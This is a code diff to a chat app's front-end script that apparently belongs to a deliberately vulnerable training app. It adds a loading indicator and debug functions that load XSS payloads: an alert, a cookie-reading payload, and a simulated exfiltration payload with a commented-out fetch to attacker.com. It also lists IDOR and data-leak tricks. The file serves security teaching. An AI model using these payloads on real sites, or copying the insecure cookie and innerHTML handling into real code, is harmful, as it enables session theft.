@@ -121,12 +121,18 @@ async function sendMessage() {
     // Clear input
     input.value = '';
     
+    // Show loading indicator
+    const loadingId = displayLoadingMessage();
+    
     // Send to server
     const response = await fetch('/api/chat', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ message })
     });
+    
+    // Remove loading indicator
+    removeLoadingMessage(loadingId);
     
     const data = await response.json();
     
@@ -173,6 +179,48 @@ function displayMessage(text, role, timestamp) {
   
   // Scroll to bottom
   chatMessages.scrollTop = chatMessages.scrollHeight;
+}
+
+function displayLoadingMessage() {
+  const chatMessages = document.getElementById('chatMessages');
+  
+  const messageDiv = document.createElement('div');
+  messageDiv.className = 'message assistant loading-message';
+  messageDiv.id = 'loading-' + Date.now();
+  
+  const bubbleDiv = document.createElement('div');
+  bubbleDiv.className = 'message-bubble';
+  
+  const roleSpan = document.createElement('div');
+  roleSpan.className = 'message-role';
+  roleSpan.textContent = 'ASSISTANT';
+  
+  const textDiv = document.createElement('div');
+  textDiv.className = 'message-text';
+  textDiv.innerHTML = '💭 Thinking<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
+  
+  bubbleDiv.appendChild(roleSpan);
+  bubbleDiv.appendChild(textDiv);
+  messageDiv.appendChild(bubbleDiv);
+  chatMessages.appendChild(messageDiv);
+  
+  // Scroll to bottom
+  chatMessages.scrollTop = chatMessages.scrollHeight;
+  
+  return messageDiv.id;
+}
+
+function removeLoadingMessage(loadingId) {
+  const loadingMsg = document.getElementById(loadingId);
+  if (loadingMsg) {
+    loadingMsg.remove();
+  }
+}
+
+function clearChatHistory() {
+  const chatMessages = document.getElementById('chatMessages');
+  chatMessages.innerHTML = '<div class="system-message"><small><strong>System:</strong> Chat history cleared. Start a new conversation!</small></div>';
+  console.log('✅ Chat history cleared (UI only - server history unchanged)');
 }
 
 async function loadMessages() {
@@ -285,9 +333,39 @@ window.debugAPI = {
    * Usage: debugAPI.sendXSS()
    */
   sendXSS: function() {
-    const payload = '<img src=x onerror=alert("XSS_from_debugAPI")>';
+    const payload = '<img src=x onerror=alert("XSS_Attack_Successful!")>';
     document.getElementById('messageInput').value = payload;
     console.log('✅ XSS payload loaded. Click "Send" button to execute.');
+    console.log('💡 Note: <script> tags don\'t work with innerHTML. Using img onerror instead.');
+  },
+  
+  /**
+   * Cookie/Session stealing XSS attack
+   * Usage: debugAPI.stealCookies()
+   */
+  stealCookies: function() {
+    const payload = '<img src=x onerror="console.log(\'🚨 STOLEN COOKIES:\', document.cookie); alert(\'Cookie: \' + document.cookie)">';
+    document.getElementById('messageInput').value = payload;
+    console.log('✅ Cookie stealing XSS payload loaded.');
+    console.log('💡 This demonstrates how XSS can steal session tokens!');
+    console.log('⚠️  In a real attack, this would send cookies to an attacker\'s server.');
+  },
+  
+  /**
+   * Advanced exfiltration attack (simulated)
+   * Usage: debugAPI.exfiltrateData()
+   */
+  exfiltrateData: function() {
+    const payload = '<img src=x onerror="' +
+      'let data={cookie:document.cookie,user:currentUser};' +
+      'console.log(\'🚨 EXFILTRATING:\',data);' +
+      'alert(\'Data stolen: \'+JSON.stringify(data));' +
+      '/* In real attack: fetch(\\\'https://attacker.com\\\',{method:\\\'POST\\\',body:JSON.stringify(data)}) */' +
+      '">';
+    document.getElementById('messageInput').value = payload;
+    console.log('✅ Advanced exfiltration payload loaded.');
+    console.log('💡 This shows how XSS can steal cookies AND user data!');
+    console.log('⚠️  Real attackers would send this to their server with fetch().');
   },
   
   /**
@@ -310,14 +388,20 @@ window.debugAPI = {
     console.log('2. debugAPI.getUsers() - Get all users (Data Leakage)');
     console.log('3. debugAPI.deleteMessage(id) - Delete any message (IDOR + Excessive Agency)');
     console.log('4. debugAPI.getSession() - View session info');
-    console.log('5. debugAPI.sendXSS() - Load XSS payload');
-    console.log('6. debugAPI.testPromptInjection() - Load prompt injection payload');
-    console.log('7. debugAPI.help() - Show this help');
+    console.log('5. debugAPI.sendXSS() - Load basic XSS payload');
+    console.log('6. debugAPI.stealCookies() - Load cookie stealing XSS');
+    console.log('7. debugAPI.exfiltrateData() - Load advanced data exfiltration XSS');
+    console.log('8. debugAPI.testPromptInjection() - Load prompt injection payload');
+    console.log('9. debugAPI.help() - Show this help');
     console.log('\n%c🎯 Try these attacks:', 'font-weight: bold;');
     console.log('- debugAPI.changeUserId(2) then loadMessages()');
     console.log('- debugAPI.getUsers()');
     console.log('- debugAPI.deleteMessage(1)');
-    console.log('- Send: <script>alert("XSS")</script>');
+    console.log('- debugAPI.stealCookies() then click Send');
+    console.log('\n%c🚨 XSS Cookie Theft Demo:', 'font-weight: bold; color: #dc3545;');
+    console.log('- debugAPI.stealCookies() - Steals session cookies via XSS');
+    console.log('- debugAPI.exfiltrateData() - Steals cookies + user data');
+    console.log('⚠️  Because httpOnly=false, JavaScript CAN access session cookies!');
   }
 };
 
